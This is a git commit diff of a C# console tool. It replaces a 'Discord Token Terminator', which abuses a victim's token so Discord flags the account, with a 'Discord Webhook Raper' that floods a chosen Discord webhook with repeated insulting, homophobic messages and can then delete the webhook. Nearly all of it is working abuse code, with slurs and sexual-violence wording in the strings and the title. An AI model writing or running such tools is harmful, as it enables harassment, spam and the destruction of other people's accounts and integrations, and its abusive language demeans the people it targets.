b1fbabfb0ffb53e141d6f658bde3cfb5412b10f7
BabiKoqi <48030041+BabiKoqi@users.noreply.github.com>
2019-09-23 10:02:11 +0200

    Added Deleting Webhooks

--- TokenTerminator/Program.cs
+++ TokenTerminator/Program.cs
@@ -2,57 +2,95 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
-using System.Threading;
-using Discord;
-using Discord.Gateway;
+using Colorful;
 using Leaf.xNet;
+using System.Threading;
+using System.Drawing;
+using System.Threading.Tasks;
 
-namespace TokenTerminator
+namespace DiscordWebhook_Raper
 {
 	class Program
 	{
+
+		public static int MSGSENT = 0;
 		static void Main(string[] args)
 		{
-			start:
-			Console.Clear();
-			Console.Title = "Discord Token Terminator - Made By (BabiKoqi)";
-			Console.Write("Whats The Token You Want To Terminate: ");
-			string token = Console.ReadLine();
-			DiscordClient client = new DiscordClient();
-		    try
-			{
-				client.Token = token;
-			}
-			catch (Exception)
-			{
-				Console.WriteLine("The Token Is Invalid");
-				Console.ReadLine();
-				goto start;
-			}
-			Console.WriteLine("Are You Sure You Want To Terminate The Token (ENTER to continue)");
-			Console.ReadLine();
-			Console.WriteLine("Getting Prepared For Termination...");
+			Colorful.Console.Title = "BabiKoqi's Discord Webhook Raper - [Anarchy Team]";
+			Colorful.Console.Write(@"
 
-			using (HttpRequest req = new HttpRequest())
+                    ▄ ▄   ▄███▄   ███    ▄  █ ████▄ ████▄ █  █▀     █▄▄▄▄ ██   █ ▄▄  ▄███▄   █▄▄▄▄ 
+                   █   █  █▀   ▀  █  █  █   █ █   █ █   █ █▄█       █  ▄▀ █ █  █   █ █▀   ▀  █  ▄▀ 
+                  █ ▄   █ ██▄▄    █ ▀ ▄ ██▀▀█ █   █ █   █ █▀▄       █▀▀▌  █▄▄█ █▀▀▀  ██▄▄    █▀▀▌  
+                  █  █  █ █▄   ▄▀ █  ▄▀ █   █ ▀████ ▀████ █  █      █  █  █  █ █     █▄   ▄▀ █  █  
+                   █ █ █  ▀███▀   ███      █                █         █      █  █    ▀███▀     █   
+                    ▀ ▀                   ▀                ▀         ▀      █    ▀            ▀    
+                                                                          ▀                       
+
+
+", Color.Purple);
+
+			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
+			Colorful.Console.Write(@"Do You Want To Delete The WebHook After The SPAM?", Color.White);
+			Colorful.Console.Write("\n[", Color.White);
+			Colorful.Console.Write("1", Color.Purple);
+			Colorful.Console.Write("] Yes", Color.White);
+			Colorful.Console.Write("\n[", Color.White);
+			Colorful.Console.Write("2", Color.Purple);
+			Colorful.Console.Write("] No", Color.White);
+			Colorful.Console.Write("\n[", Color.White);
+			Colorful.Console.Write("input", Color.Purple);
+			Colorful.Console.Write("]: ", Color.White);
+			int delete = Convert.ToInt32(Colorful.Console.ReadLine());
+
+			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
+			Colorful.Console.Write("What Webhook Do You Want To Rape: ", Color.White);
+			string hook = Colorful.Console.ReadLine();
+			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
+			Colorful.Console.Write("How Many Times Do You Want To Send The Message: ", Color.White);
+			int times = Convert.ToInt32(Colorful.Console.ReadLine());
+			Colorful.Console.Write(DateTime.Now.ToString("\n\n[HH:mm:ss]> "), Color.LimeGreen);
+			Colorful.Console.Write("Starting To Rape The Webhook...\n\n", Color.White);
+
+			bool working = true;
+
+			Task.Factory.StartNew(delegate ()
 			{
-				for (int i = 0; i < 30; i++)
+				while (working)
+			    {
+					Colorful.Console.Title = $"BabiKoqi's Discord Webhook Raper - Msgs Sent:[{MSGSENT}] - [Anarchy Team]";
+				}
+			});
+
+			for (int i = 0; i < times; i++)
+			{
+				try
 				{
-					try
+					using (HttpRequest req = new HttpRequest())
 					{
-						req.AddHeader("Authorization", token);
-						req.Post("https://discordapp.com/api/v6/invite/minecraft");
-						client.Token = token;
-					}
-
-					catch (Exception)
-					{
-						Console.WriteLine("Token Got Succesfully Terminated");
-						Console.ReadLine();
-						Environment.Exit(0);
+						string request = req.Post(hook, "{\"username\":\"BabiKoqi's Slave\",\"embeds\":[{\"title\":\"You Got Fucked By BabiKoqi!! Enjoy⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\",\"description\": \"You Just Got Fucked By One Of AnarchyTeam Members, How Do You Feel? Well U Should Start To Cry Now U Gay Bitch\",\"type\":\"rich\",\"color\":\"4194432\",\"footer\":{\"text\":\"Enjoy These Spams By BabiKoqi!!\"},\"author\":{\"name\":\"BabiKoqi\",\"icon_url\":\"https://i.imgur.com/Y81Ia57.jpg\",\"url\":\"https://cracked.to/member.php?action=profile&uid=118633\"}}]}", "application/json").ToString();
+						Thread.Sleep(35);
 					}
 				}
+				catch
+				{
+
+				}
+				MSGSENT++;
+				Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
+				Colorful.Console.WriteLine($"Message Number [{MSGSENT}] Was Sent.", Color.White);
 			}
+			if (delete == 1)
+			{
+				string deletehook = new HttpRequest().Delete(hook).ToString();
+				Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
+				Colorful.Console.Write("The WebHook Got Deleted.\n\n", Color.White);
+			}
+			Colorful.Console.Write("\n\n");
+			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
+			Colorful.Console.Write("Program Finished Its Work...");
+			Colorful.Console.ReadLine();
+
 		}
 	}
 }
